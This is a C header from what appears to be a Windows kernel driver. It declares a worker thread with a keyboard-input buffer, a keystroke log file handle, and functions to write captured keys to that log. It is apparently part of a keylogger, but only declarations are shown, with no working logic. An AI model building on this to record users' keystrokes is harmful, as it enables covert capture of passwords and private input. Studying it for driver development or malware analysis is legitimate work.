#pragma once
#include "SharedArray.h"

typedef struct _WORKER_THREAD
{
	HANDLE					threadHandle;					//handle to the worker thread
	PETHREAD				threadObjPtr;					//pointer to the worker thread object
	BOOLEAN					keepRunning;					//used to shut thread down (the thread runs in infinite loop)
	KEYBOARD_INPUT_DATA		buffer[SZ_SHARED_ARRAY + 1];	//worker thread's private buffer
	HANDLE					logfile;						//handle to keystroke log file
}WORKER_THREAD, * PWORKER_THREAD;



NTSTATUS initWorkerThread();

void initLogFile();

void writeToLog(DWORD nElements);

void destroyWorkerThread();

VOID threadMain(IN PVOID pContext);